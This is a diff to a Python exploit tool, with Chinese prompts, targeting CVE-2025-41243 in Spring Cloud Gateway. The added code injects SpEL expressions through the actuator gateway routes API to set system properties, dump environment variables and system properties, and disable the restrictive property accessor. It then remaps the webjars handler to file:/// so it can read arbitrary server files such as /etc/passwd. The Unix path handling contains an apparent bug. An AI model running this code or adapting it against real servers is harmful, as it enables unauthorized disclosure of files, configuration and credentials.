@@ -593,12 +593,80 @@ def CVE_2025_41243(url, proxies, header_new):
             cprint("[-] CVE-2025-41243漏洞不存在\n", "yellow")
 
         while vul_status == 1:
-            Key = input("[+] 请输入要设置的环境的键>>> ")
-            if Key == "exit":
-                sys.exit()
-            else:
-                payload_setevn = """{
-  "id": "route-spel-readdata",
+            Do = int(input("[+] 输入1来设置环境变量，输入2来读取任意文件>>> "))
+
+            if Do == 1:
+                Key = input("[+] 请输入要设置的环境的键>>> ")
+                if Key == "exit":
+                    sys.exit()
+                else:
+                    payload_setevn = """{
+      "id": "route-spel-readdata",
+      "uri": "http://1.2.3.4:8443/",
+      "predicates": [{
+        "name": "Path",
+        "args": {
+          "pattern": "/malicious"
+        }
+      }],
+      "filters": [
+      {
+        "name": "AddRequestHeader",
+        "args": {
+          "name": "X-SpEL-set-systemProperties",
+          "value": "#{@systemProperties['okkk'] != 'true' ? (@systemProperties['okkk'] = 'true') + @refreshEndpoint.refresh : 'ok'}"
+        }
+      },
+      {
+        "name": "AddRequestHeader",
+        "args": {
+          "name": "X-SpEL-get-environment",
+          "value": "#{@environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*'][0].source.![{#this.getKey, #this.getValue.toString}]}"
+        }
+      },
+      {
+        "name": "AddRequestHeader",
+        "args": {
+          "name": "X-SpEL-get-systemProperties",
+          "value": "#{@systemProperties.![{#this.key, #this.value.toString}]}"
+        }
+      }
+    ]
+    }
+    """
+                    payload_setevn = payload_setevn.replace('okkk', Key)
+
+                    Value = input("[+] 请输入要设置的环境的值>>> ")
+                    payload_setevn = payload_setevn.replace('true', Value)
+
+                    random_string = generate_random_route(5)
+                    try:
+                        payload_json = json.loads(payload_setevn)
+                    except json.JSONDecodeError as e:
+                        print(f"Error parsing JSON: {e}")
+                        exit(1)
+                    payload_json['id'] = random_string
+
+                    requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                        timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                        verify=False, proxies=proxies)
+                    re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+                                       verify=False, proxies=proxies)
+                    requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                          timeout=outtime,
+                                          verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                        verify=False, proxies=proxies)
+                    result = re3.text
+                    cprint(result, "green")
+                    print('\n')
+
+            elif Do == 2:
+                is_Windows = input("[+] 目标是否为Windows系统？（y/n）>>> ")
+
+                payload_readfile = """{
+  "id": "lbz",
   "uri": "http://1.2.3.4:8443/",
   "predicates": [{
     "name": "Path",
@@ -610,54 +678,113 @@ def CVE_2025_41243(url, proxies, header_new):
   {
     "name": "AddRequestHeader",
     "args": {
-      "name": "X-SpEL-set-systemProperties",
-      "value": "#{@systemProperties['okkk'] != 'true' ? (@systemProperties['okkk'] = 'true') + @refreshEndpoint.refresh : 'ok'}"
+      "name": "aa",
+      "value": "#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = 'false'}"
     }
   },
   {
     "name": "AddRequestHeader",
     "args": {
-      "name": "X-SpEL-get-environment",
-      "value": "#{@environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*'][0].source.![{#this.getKey, #this.getValue.toString}]}"
+      "name": "bb",
+      "value": "#{ @resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='META-INF/resources/'}"
     }
   },
   {
     "name": "AddRequestHeader",
     "args": {
-      "name": "X-SpEL-get-systemProperties",
-      "value": "#{@systemProperties.![{#this.key, #this.value.toString}]}"
+      "name": "cc",
+      "value": "#{ @resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}"
     }
   }
 ]
 }
-"""
-                payload_setevn = payload_setevn.replace('okkk', Key)
+                """
+                if is_Windows == 'y':
+                    FilePath = input("[+] 请输入要读取的文件路径（如C:\\Windows\\win.ini）>>> ")
+                    FilePath = FilePath.strip().replace('\\', '/')
+                    FilePath_left = FilePath.split('/', 1)[0]
+                    FilePath_right = FilePath.split('/', 1)[1]
+                    formated_path = 'file:///' + FilePath_left + '/'
+                    payload_rf = payload_readfile.replace('META-INF/resources/', formated_path)
 
-                Value = input("[+] 请输入要设置的环境的值>>> ")
-                payload_setevn = payload_setevn.replace('true', Value)
+                    random_string = generate_random_route(5)
+                    try:
+                        payload_json = json.loads(payload_rf)
+                    except json.JSONDecodeError as e:
+                        print(f"Error parsing JSON: {e}")
+                        exit(1)
+                    payload_json['id'] = random_string
 
-                random_string = generate_random_route(5)
-                try:
-                    payload_json = json.loads(payload_setevn)
-                except json.JSONDecodeError as e:
-                    print(f"Error parsing JSON: {e}")
-                    exit(1)
-                payload_json['id'] = random_string
+                    requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                  timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
 
-                requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
-                                    timeout=outtime, json=payload_json, verify=False, proxies=proxies)
-                requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                    res = requests.get(url=url + "webjars/" + FilePath_right, headers=header_new, timeout=outtime, verify=False, proxies=proxies)
+
+                    try:
+                        payload_json = json.loads(payload_rf)
+                    except json.JSONDecodeError as e:
+                        print(f"Error parsing JSON: {e}")
+                        exit(1)
+                    payload_json['id'] = random_string
+
+                    requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                  timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
+                    requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                    timeout=outtime,
                                     verify=False, proxies=proxies)
-                re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
-                                   verify=False, proxies=proxies)
-                requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
-                                      timeout=outtime,
-                                      verify=False, proxies=proxies)
-                requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
+                    result = res.text
+                    cprint(result, "green")
+                    print('\n')
+
+                elif is_Windows == 'n':
+                    FilePath = input("[+] 请输入要读取的文件路径（如/etc/passwd）>>> ")
+                    FilePath_right = FilePath.lstrip('/')[1]
+                    formated_path = 'file:///' + FilePath_right
+
+                    payload_rf = payload_readfile.replace('META-INF/resources/', formated_path)
+
+                    random_string = generate_random_route(5)
+                    try:
+                        payload_json = json.loads(payload_rf)
+                    except json.JSONDecodeError as e:
+                        print(f"Error parsing JSON: {e}")
+                        exit(1)
+                    payload_json['id'] = random_string
+
+                    requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                  timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
+
+                    res = requests.get(url=url + "webjars/" + FilePath_right, headers=header_new, timeout=outtime,
+                                       verify=False, proxies=proxies)
+
+                    try:
+                        payload_json = json.loads(payload_rf)
+                    except json.JSONDecodeError as e:
+                        print(f"Error parsing JSON: {e}")
+                        exit(1)
+                    payload_json['id'] = random_string
+
+                    requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                  timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
+                    requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                    timeout=outtime,
                                     verify=False, proxies=proxies)
-                result = re3.text
-                cprint(result, "green")
-                print('\n')
+                    requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                  verify=False, proxies=proxies)
+                    result = res.text
+                    cprint(result, "green")
+                    print('\n')
+
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
